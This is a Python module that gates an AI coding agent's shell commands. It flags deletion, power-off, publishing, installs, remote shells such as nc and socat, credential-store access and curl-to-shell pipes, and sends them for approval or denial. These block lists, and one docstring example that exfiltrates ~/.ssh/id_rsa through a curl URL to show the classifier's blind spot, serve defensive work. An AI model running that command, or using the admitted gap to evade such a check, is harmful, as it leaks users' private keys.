"""Classify shell commands before execution.

The policy deliberately operates on recognizable shell syntax, not on the
eventual effects of arbitrary programs. It identifies command families Raven
can classify reliably, including commands hidden behind common wrappers, while
the runtime sandbox remains responsible for its separate containment boundary.

Classification order is security-sensitive: hard-denied commands must never be
downgraded into approval requests, and matcher failures fail closed instead of
silently permitting execution.
"""

from __future__ import annotations

import re
import shlex
from collections.abc import Callable, Iterator
from contextvars import ContextVar
from enum import StrEnum
from pathlib import PurePath

ApprovalMatcher = Callable[[str], bool]

_WRAPPER_OPTIONS_WITH_VALUE = {
    "command": frozenset(),
    "env": frozenset({"-u", "--unset", "-C", "--chdir", "-S", "--split-string"}),
    "nohup": frozenset(),
    "sudo": frozenset(
        {
            "-C",
            "--close-from",
            "-D",
            "--chdir",
            "-g",
            "--group",
            "-h",
            "--host",
            "-p",
            "--prompt",
            "-r",
            "--role",
            "-t",
            "--type",
            "-T",
            "--command-timeout",
            "-u",
            "--user",
        }
    ),
}
_ASSIGNMENT = re.compile(r"[A-Za-z_][A-Za-z0-9_]*=.*", re.DOTALL)
_COMMAND_BOUNDARIES = frozenset(";&|\n(){}`")
_SHELL_COMMAND_WRAPPERS = frozenset({"bash", "dash", "ksh", "sh", "zsh"})
_SYSTEM_POWER_COMMANDS = frozenset({"halt", "poweroff", "reboot", "shutdown"})
_POWER_MULTIPLEXERS = frozenset({"busybox", "init", "loginctl", "systemctl", "telinit"})
_POWER_MULTIPLEXER_ACTIONS = _SYSTEM_POWER_COMMANDS | {"0", "6"}
_MAX_EMBEDDED_SHELL_DEPTH = 4


class CommandDecision(StrEnum):
    """Policy outcomes ordered from ordinary execution to terminal rejection."""

    ALLOW = "allow"
    HARD_DENY = "hard_deny"
    REQUIRE_APPROVAL = "require_approval"


def _command_segments(command: str) -> Iterator[list[str]]:
    """Yield compound shell commands as independently classified token lists.

    This conservative lexical split catches deletion in common sequence,
    conditional, and pipeline forms without pretending to evaluate expansions
    or reproduce the full shell grammar.
    """

    lexer = shlex.shlex(command, posix=True, punctuation_chars=";&|(){}`\n")
    lexer.commenters = ""
    # Newlines must remain visible as command boundaries. Quoted newlines are
    # still returned inside their quoted token and therefore do not split it.
    lexer.whitespace = " \t\r"
    lexer.whitespace_split = True
    segment: list[str] = []
    for token in lexer:
        if token and all(char in _COMMAND_BOUNDARIES for char in token):
            if segment:
                yield segment
                segment = []
            continue
        segment.append(token)
    if segment:
        yield segment


def _embedded_shell_command(segment: list[str]) -> str | None:
    """Return the command string supplied to a recognized shell ``-c``."""

    if not segment or PurePath(segment[0]).name not in _SHELL_COMMAND_WRAPPERS:
        return None
    for index, token in enumerate(segment[1:], start=1):
        if not token.startswith("-") or token.startswith("--"):
            continue
        command_option = token.find("c", 1)
        if command_option == -1:
            continue
        if command_option + 1 < len(token):
            return token[command_option + 1 :]
        if index + 1 < len(segment):
            return segment[index + 1]
    return None


def _matches_delete_command(command: str, *, _depth: int = 0) -> bool:
    """Recognize direct file-deletion commands after wrapper normalization."""

    for segment in _command_segments(command):
        segment = _unwrap_command_wrappers(segment)
        if not segment:
            continue
        executable = PurePath(segment[0]).name
        if executable in {"rm", "unlink"}:
            return True
        if executable == "find":
            if "-delete" in segment[1:]:
                return True
            for index, token in enumerate(segment[1:], start=1):
                if token not in {"-exec", "-execdir"}:
                    continue
                executed = _unwrap_command_wrappers(segment[index + 1 :])
                if not executed:
                    continue
                if PurePath(executed[0]).name in {"rm", "unlink"}:
                    return True
                embedded_exec = _embedded_shell_command(executed)
                if (
                    embedded_exec is not None
                    and _depth < _MAX_EMBEDDED_SHELL_DEPTH
                    and _matches_delete_command(embedded_exec, _depth=_depth + 1)
                ):
                    return True
        embedded = _embedded_shell_command(segment)
        if (
            embedded is not None
            and _depth < _MAX_EMBEDDED_SHELL_DEPTH
            and _matches_delete_command(embedded, _depth=_depth + 1)
        ):
            return True
    return False


def _matches_system_power_command(command: str, *, _depth: int = 0) -> bool:
    """Recognize power-control executables without matching argument text."""

    for segment in _command_segments(command):
        segment = _unwrap_command_wrappers(segment)
        if not segment:
            continue
        executable = PurePath(segment[0]).name
        if executable in _SYSTEM_POWER_COMMANDS:
            return True
        if executable in _POWER_MULTIPLEXERS and any(arg in _POWER_MULTIPLEXER_ACTIONS for arg in segment[1:]):
            return True
        embedded = _embedded_shell_command(segment)
        if (
            embedded is not None
            and _depth < _MAX_EMBEDDED_SHELL_DEPTH
            and _matches_system_power_command(embedded, _depth=_depth + 1)
        ):
            return True
    return False


def _unwrap_command_wrappers(segment: list[str]) -> list[str]:
    """Expose an executable hidden behind assignments, env, sudo, or command.

    Normalizing well-known wrappers prevents trivial approval bypasses. Unknown
    executables and option shapes remain untouched rather than being guessed at.
    """

    tokens = list(segment)
    while tokens:
        while tokens and _ASSIGNMENT.fullmatch(tokens[0]):
            tokens.pop(0)
        if not tokens:
            return tokens
        wrapper = PurePath(tokens[0]).name
        options_with_value = _WRAPPER_OPTIONS_WITH_VALUE.get(wrapper)
        if options_with_value is None:
            return tokens
        tokens = tokens[1:]
        while tokens and tokens[0].startswith("-"):
            option = tokens.pop(0)
            if option == "--":
                break
            option_name = option.split("=", 1)[0]
            if option_name in options_with_value and "=" not in option and tokens:
                tokens.pop(0)
        if wrapper == "env":
            while tokens and "=" in tokens[0] and not tokens[0].startswith("="):
                tokens = tokens[1:]
    return tokens


def _iter_argv(command: str, *, _depth: int = 0) -> Iterator[list[str]]:
    """Yield every argv this command string actually runs, wrappers removed.

    The recursion the family matchers below would each have to repeat: compound
    segments, ``sudo``/``env``/assignment wrappers and an embedded ``sh -c``.
    Written once so a family cannot be accidentally shallower than its neighbours -- the failure that turns
    ``sh -c "git push"`` into an unclassified command while ``git push`` prompts.
    """

    for segment in _command_segments(command):
        segment = _unwrap_command_wrappers(segment)
        if not segment:
            continue
        yield segment
        if _depth >= _MAX_EMBEDDED_SHELL_DEPTH:
            continue
        # Only the embedded shell here. Seeing through a command RUNNER
        # (``timeout 5 git push``) needs a helper this module does not have, so
        # that wrapper hides a family match -- exactly as it already hides a
        # delete from ``_matches_delete_command``. This gate is therefore no
        # weaker than the surface it joins, and no stronger; the gap is written
        # here rather than left to be found.
        nested = _embedded_shell_command(segment)
        if nested is not None:
            yield from _iter_argv(nested, _depth=_depth + 1)


# Global options that take their value as the next word, per executable. Only
# options certain to take one are listed, and the asymmetry is the point: an
# option missing from this table leaves its value among the words, which
# over-reads by one and can only make a caller ask about more than it must,
# while listing a boolean flag by mistake would consume the verb itself and let
# the command through. When unsure, leave it out. Options that carry their value
# attached (``--git-dir=X``, ``terraform -chdir=DIR``) need no entry.
_GLOBAL_OPTIONS_WITH_VALUE: dict[str, frozenset[str]] = {
    "git": frozenset({"-C", "-c", "--git-dir", "--work-tree", "--namespace", "--config-env"}),
    "gh": frozenset({"-R", "--repo", "--hostname"}),
    "glab": frozenset({"-R", "--repo", "--host"}),
    "npm": frozenset({"-C", "--prefix", "-w", "--workspace", "--registry", "--userconfig", "--globalconfig"}),
    "pnpm": frozenset({"-C", "--dir", "-F", "--filter"}),
    "yarn": frozenset({"--cwd"}),
    "bun": frozenset({"--cwd"}),
    "docker": frozenset({"-H", "--host", "-c", "--context", "--config", "-l", "--log-level"}),
    "podman": frozenset({"--connection", "--root", "--runtime", "--url"}),
    "kubectl": frozenset(
        {
            "-n",
            "--namespace",
            "--context",
            "--cluster",
            "--kubeconfig",
            "--user",
            "-s",
            "--server",
            "--as",
            "--token",
            "--request-timeout",
        }
    ),
    "helm": frozenset({"-n", "--namespace", "--kube-context", "--kubeconfig"}),
    "aws": frozenset(
        {
            "--profile",
            "--region",
            "--endpoint-url",
            "--output",
            "--color",
            "--ca-bundle",
            "--cli-read-timeout",
            "--cli-connect-timeout",
        }
    ),
    "gcloud": frozenset(
        {
            "--project",
            "--account",
            "--configuration",
            "--billing-project",
            "--impersonate-service-account",
            "--verbosity",
            "--format",
        }
    ),
    "cargo": frozenset({"-Z", "--manifest-path", "--config", "--color"}),
    "pip": frozenset(
        {
            "-i",
            "--index-url",
            "--extra-index-url",
            "--cache-dir",
            "--log",
            "--proxy",
            "--timeout",
            "--retries",
            "--python",
        }
    ),
    "pip3": frozenset(
        {
            "-i",
            "--index-url",
            "--extra-index-url",
            "--cache-dir",
            "--log",
            "--proxy",
            "--timeout",
            "--retries",
            "--python",
        }
    ),
    "uv": frozenset({"-p", "--python", "--directory", "--project", "--cache-dir", "--config-file", "--color"}),
    "pipx": frozenset({"--python"}),
    "poetry": frozenset({"-C", "--directory", "--project"}),
    "systemctl": frozenset({"-H", "--host", "-M", "--machine", "-t", "--type"}),
}


def _subcommands(argv: list[str], count: int = 2) -> list[str]:
    """The first few non-option words after the executable.

    An option's value is consumed when the executable is known to take one
    there. Skipping the option but not its value counted the value as one of the
    words being looked for, so the budget ran out before the verb:
    ``git --git-dir X --work-tree Y push`` read as the two paths and never saw
    ``push`` -- an ALLOW for the command that bare ``git push`` prompts about.
    ``aws --profile p --region r s3 cp`` lost ``s3`` the same way.

    ``git -C /repo push`` and ``git push`` still have to read the same, which is
    what the table delivers exactly rather than by over-reading. See
    :data:`_GLOBAL_OPTIONS_WITH_VALUE` for why an incomplete table is the safe
    kind of incomplete.
    """

    options_with_value = _GLOBAL_OPTIONS_WITH_VALUE.get(PurePath(argv[0]).name, frozenset())
    words: list[str] = []
    rest = list(argv[1:])
    while rest:
        word = rest.pop(0)
        if word == "--":
            # Everything after it is an argument, so there is no subcommand left
            # to find. Continuing would collect operands as candidate verbs.
            break
        if word.startswith("-"):
            if "=" not in word and word in options_with_value and rest:
                rest.pop(0)
            continue
        words.append(word)
        if len(words) >= count:
            break
    return words


_PUBLISH_SUBCOMMANDS: dict[str, frozenset[str]] = {
    "git": frozenset({"push"}),
    "gh": frozenset({"pr", "release", "repo", "workflow", "secret"}),
    "glab": frozenset({"mr", "release", "repo"}),
    "npm": frozenset({"publish"}),
    "pnpm": frozenset({"publish"}),
    "yarn": frozenset({"publish"}),
    "cargo": frozenset({"publish"}),
    "docker": frozenset({"push"}),
    "gcloud": frozenset({"deploy"}),
    "kubectl": frozenset({"apply", "delete", "create", "patch", "replace"}),
    "terraform": frozenset({"apply", "destroy"}),
    "aws": frozenset({"s3", "s3api", "lambda", "cloudformation"}),
}
_PUBLISH_EXECUTABLES = frozenset({"twine", "flyctl", "fly", "vercel", "netlify", "heroku"})

_INSTALL_SUBCOMMANDS: dict[str, frozenset[str]] = {
    "npm": frozenset({"install", "i", "ci", "add", "exec", "create"}),
    "pnpm": frozenset({"install", "add", "dlx", "create"}),
    "yarn": frozenset({"install", "add", "dlx", "create"}),
    "bun": frozenset({"install", "add", "x", "create"}),
    "pip": frozenset({"install"}),
    "pip3": frozenset({"install"}),
    "uv": frozenset({"add", "pip", "tool", "sync"}),
    "uvx": frozenset(),
    "pipx": frozenset({"install", "run"}),
    "poetry": frozenset({"add", "install"}),
    "gem": frozenset({"install"}),
    "cargo": frozenset({"install"}),
    "go": frozenset({"install", "get"}),
    "brew": frozenset({"install", "reinstall", "upgrade", "tap"}),
    "apt": frozenset({"install", "upgrade"}),
    "apt-get": frozenset({"install", "upgrade"}),
    "dnf": frozenset({"install", "upgrade"}),
    "yum": frozenset({"install", "upgrade"}),
    "apk": frozenset({"add"}),
    "pacman": frozenset({"-S"}),
    "gh": frozenset({"extension"}),
    "code": frozenset({"--install-extension"}),
}

_REMOTE_EXEC_EXECUTABLES = frozenset({"ssh", "scp", "sftp", "rsync", "telnet", "nc", "ncat", "socat"})
_REMOTE_EXEC_SUBCOMMANDS: dict[str, frozenset[str]] = {
    "docker": frozenset({"run", "exec", "compose"}),
    "podman": frozenset({"run", "exec"}),
    "kubectl": frozenset({"exec", "port-forward", "cp"}),
}

_CREDENTIAL_EXECUTABLES = frozenset({"security", "keyring", "pass", "op", "vault", "gpg"})
_CREDENTIAL_SUBCOMMANDS: dict[str, frozenset[str]] = {
    "gh": frozenset({"auth"}),
    "glab": frozenset({"auth"}),
    "aws": frozenset({"configure", "sso"}),
    "gcloud": frozenset({"auth"}),
    "az": frozenset({"login"}),
    "docker": frozenset({"login"}),
    "npm": frozenset({"login", "adduser", "token"}),
    "heroku": frozenset({"auth", "login"}),
    "git": frozenset({"credential"}),
}

# ``git`` subcommands that discard work the agent cannot get back. Included
# because a checkpoint is not a backup: the per-turn shadow commit covers the
# working directory, and these throw away exactly what has not been committed.
_DESTRUCTIVE_GIT: dict[str, frozenset[str]] = {
    "reset": frozenset({"--hard"}),
    "clean": frozenset({"-f", "-fd", "-fdx", "-xdf", "-df", "--force"}),
    "checkout": frozenset({"--", "-f", "--force"}),
    "restore": frozenset({"--", "-W", "--worktree", "--staged"}),
    "branch": frozenset({"-D"}),
    "push": frozenset({"-f", "--force", "--delete"}),
    "filter-branch": frozenset(),
    "stash": frozenset({"drop", "clear"}),
}

_FETCHERS = frozenset({"curl", "wget", "http", "https", "httpie"})
# Flags that turn a fetch from "read something" into "write something here" or
# "send something out". A bare GET to stdout is not in this set on purpose: an
# editor's agent reads documentation constantly, and prompting for every read
# trains the reader to approve without looking, which is worse than not asking.
_FETCH_WRITE_FLAGS = frozenset({"-o", "-O", "--output", "--output-document", "-T", "--upload-file", "--remote-name"})
_FETCH_SEND_FLAGS = frozenset(
    {"-d", "--data", "--data-binary", "--data-raw", "--data-urlencode", "-F", "--form", "-X", "--request"}
)


def _matches_publish_command(command: str) -> bool:
    """A command that pushes work somewhere other people can see it."""

    for argv in _iter_argv(command):
        executable = PurePath(argv[0]).name
        if executable in _PUBLISH_EXECUTABLES:
            return True
        allowed = _PUBLISH_SUBCOMMANDS.get(executable)
        if allowed and any(word in allowed for word in _subcommands(argv)):
            return True
    return False


def _matches_install_command(command: str) -> bool:
    """A command that installs software.

    Approval-worthy for the reason a lockfile exists: a package manager runs
    install scripts from the network as the current user, so "install one
    dependency" and "run arbitrary code" are the same act.
    """

    for argv in _iter_argv(command):
        executable = PurePath(argv[0]).name
        if executable not in _INSTALL_SUBCOMMANDS:
            continue
        allowed = _INSTALL_SUBCOMMANDS[executable]
        if not allowed:
            return True
        words = _subcommands(argv)
        if any(word in allowed for word in words):
            return True
        # ``pacman -S`` and ``code --install-extension`` put the verb in an
        # option rather than a word, so the flags are checked too.
        if any(token in allowed for token in argv[1:]):
            return True
    return False


def _matches_remote_exec_command(command: str) -> bool:
    """A command that runs something, or moves something, on another machine."""

    for argv in _iter_argv(command):
        executable = PurePath(argv[0]).name
        if executable in _REMOTE_EXEC_EXECUTABLES:
            return True
        allowed = _REMOTE_EXEC_SUBCOMMANDS.get(executable)
        if allowed and any(word in allowed for word in _subcommands(argv)):
            return True
    return False


def _matches_credential_command(command: str) -> bool:
    """A command that reads or writes a credential store."""

    for argv in _iter_argv(command):
        executable = PurePath(argv[0]).name
        if executable in _CREDENTIAL_EXECUTABLES:
            return True
        allowed = _CREDENTIAL_SUBCOMMANDS.get(executable)
        if allowed and any(word in allowed for word in _subcommands(argv)):
            return True
    return False


def _matches_destructive_vcs_command(command: str) -> bool:
    """A ``git`` command that discards work rather than recording it."""

    for argv in _iter_argv(command):
        if PurePath(argv[0]).name != "git":
            continue
        words = _subcommands(argv, count=3)
        for word in words:
            flags = _DESTRUCTIVE_GIT.get(word)
            if flags is None:
                continue
            if not flags:
                return True
            rest = argv[argv.index(word) + 1 :]
            if any(token in flags for token in rest):
                return True
    return False


def _matches_fetch_side_effect(command: str) -> bool:
    """A download that writes a file, sends data, or is piped into a shell."""

    argv_list = list(_iter_argv(command))
    for argv in argv_list:
        executable = PurePath(argv[0]).name
        if executable not in _FETCHERS:
            continue
        for token in argv[1:]:
            head = token.split("=", 1)[0]
            if head in _FETCH_WRITE_FLAGS or head in _FETCH_SEND_FLAGS:
                return True
    # Fetch piped into an interpreter, which is the shape that makes a download
    # an execution. Checked across segments rather than inside one, because the
    # pipe is what splits them.
    executables = [PurePath(argv[0]).name for argv in argv_list]
    if any(name in _FETCHERS for name in executables) and any(
        name in _SHELL_COMMAND_WRAPPERS or name in {"python", "python3", "node", "ruby", "perl", "php"}
        for name in executables
    ):
        return True
    return False


_SURFACE_FAMILIES: ContextVar[tuple[tuple[str, ApprovalMatcher], ...]] = ContextVar(
    "raven_surface_approval_families", default=()
)


def set_surface_approval_families(families: tuple[tuple[str, ApprovalMatcher], ...]) -> None:
    """Declare the families every tool on THIS surface must ask about.

    Per surface rather than per tool because a per-tool registration reaches the
    main loop only: a sub-agent builds its own ``ExecTool`` with its own policy,
    so a delegated ``git push`` runs unannounced while the identical command asks
    in the main agent.

    A ContextVar and not a module global, which is the difference between a scope
    and a leak. A task copies the context it was created in, so every tool built
    under the connection that declared this -- the main loop's, and each
    sub-agent's, however deep -- inherits it, while a second connection, or a
    test, is unaffected by what another one declared.

    Must be set before the tools are built: a policy reads this once at
    construction, so a tool made earlier keeps the families it was born with.
    """

    _SURFACE_FAMILIES.set(tuple(families))


def surface_approval_families() -> tuple[tuple[str, ApprovalMatcher], ...]:
    """The families this surface asks about; empty unless one declared them."""

    return _SURFACE_FAMILIES.get()


EXTERNAL_EFFECT_MATCHERS: tuple[tuple[str, ApprovalMatcher], ...] = (
    ("publish_command", _matches_publish_command),
    ("install_command", _matches_install_command),
    ("remote_exec_command", _matches_remote_exec_command),
    ("credential_command", _matches_credential_command),
    ("destructive_vcs_command", _matches_destructive_vcs_command),
    ("fetch_side_effect", _matches_fetch_side_effect),
)
"""Command families whose effect leaves the working directory, as opt-in matchers.

Not registered by default. The built-in policy asks about exactly one family --
deletion -- which is right for a terminal the reader is already looking at, and
wrong for an agent running behind an editor where nothing is on screen. A surface
that wants to ask registers these; ``raven acp`` does.

The line drawn here is "hard to undo from outside this directory", not "dangerous":
a build, a test run, a formatter, a file edit and a plain ``curl`` of a
documentation page all stay unprompted, because a prompt on each of those trains
the reader to approve without looking -- which costs more than it buys.

**The gap, stated rather than papered over:** any command with network access can
exfiltrate, and no token-level classifier can see that. ``curl
https://host/$(cat ~/.ssh/id_rsa)`` is a plain GET. What this catches is the
careless case and the visible case, not a determined one; containment is the
sandbox's job, not the classifier's.
"""


class ShellCommandPolicy:
    """Apply hard-deny and approval rules in their required precedence order."""

    def __init__(self, *, deny_patterns: list[str]) -> None:
        # Compile once because every direct shell execution crosses this policy.
        self._deny_patterns = tuple(re.compile(pattern, re.IGNORECASE) for pattern in deny_patterns)
        # Deletion is built in and marked as contained: a sandbox really does hold
        # it, so a sandboxed turn does not have to ask about it.
        self._approval_matchers: list[tuple[str, ApprovalMatcher, bool]] = [
            ("delete_command", _matches_delete_command, False)
        ]
        # Whatever this surface asks about, picked up at construction so a tool
        # built later -- a sub-agent's, most of all -- carries the same families as
        # the main loop's. Without this a delegated ``git push`` runs unannounced.
        for name, matcher in surface_approval_families():
            self._approval_matchers.append((name, matcher, True))

    def register_approval_matcher(self, name: str, matcher: ApprovalMatcher, *, escapes_sandbox: bool = True) -> None:
        """Extend approval classification with a named command-family matcher.

        ``escapes_sandbox`` says whether a sandbox contains this family's effect.
        True by default because the families a surface registers are the ones
        whose effects leave the workspace -- pushing, installing, reaching another
        machine -- and a microVM does not contain a network call. A family a
        sandbox really does hold (deletion) sets it False, which is what lets a
        sandboxed turn skip the prompt it does not need.
        """

        self._approval_matchers.append((name, matcher, escapes_sandbox))

    def approval_reason(self, command: str, *, sandboxed: bool = False) -> str | None:
        """The name of the family that makes this command need approval.

        Separate from :meth:`evaluate` because the caller needs both answers and
        they are not the same question: ``evaluate`` decides, this explains. A
        prompt that says only "this command needs approval" gives the reader
        nothing to decide with, and the description ``ExecTool`` used before this
        existed was a constant -- it read "Delete files using a shell command"
        for every family, because deletion was the only one registered.

        Returns ``None`` when nothing requires approval, including for a
        hard-denied command: there is no prompt to explain.
        """

        if not sandboxed and any(pattern.search(command) for pattern in self._deny_patterns):
            return None
        try:
            # Only the hard denies short-circuit: there is no prompt to explain
            # for a command that will not run. Deletion is NOT one of them here
            # -- it reaches this surface as a registered matcher like every other
            # family, so it must fall through and name itself, or the prompt for
            # an ``rm`` loses the one line that says what it is about.
            if not sandboxed and _matches_system_power_command(command):
                return None
            for name, matcher, escapes in self._approval_matchers:
                if sandboxed and not escapes:
                    continue
                if matcher(command):
                    return name
        except Exception:
            # Mirrors ``evaluate``'s fail-closed branch, which turns a faulty
            # matcher into a hard deny -- and a hard deny has no reason to give.
            return None
        return None

    def evaluate(self, command: str, *, sandboxed: bool = False) -> CommandDecision:
        """Classify a command, reducing authority when a matcher cannot decide."""

        # Hard deny runs first so an approval matcher can never convert an
        # unconditionally forbidden command into an approvable operation.
        #
        # Every refusal below is about damage a sandbox holds: a deny pattern, or
        # the machine powered off. Inside a microVM the machine in question IS the
        # sandbox, which is what the sandboxed path is allowed to skip -- and
        # skipping it is the point of running one. What a sandbox does NOT hold is
        # a push, an install, or a connection to another machine, so those
        # families still ask.
        if not sandboxed and any(pattern.search(command) for pattern in self._deny_patterns):
            return CommandDecision.HARD_DENY
        try:
            if not sandboxed and _matches_system_power_command(command):
                return CommandDecision.HARD_DENY
            if any(matcher(command) for _name, matcher, escapes in self._approval_matchers if escapes or not sandboxed):
                return CommandDecision.REQUIRE_APPROVAL
        except Exception:
            # Matchers inspect untrusted command text and may be extended later.
            # A faulty matcher must close the gate, not bypass it.
            return CommandDecision.HARD_DENY
        return CommandDecision.ALLOW


__all__ = [
    "EXTERNAL_EFFECT_MATCHERS",
    "ApprovalMatcher",
    "CommandDecision",
    "ShellCommandPolicy",
    "set_surface_approval_families",
    "surface_approval_families",
]
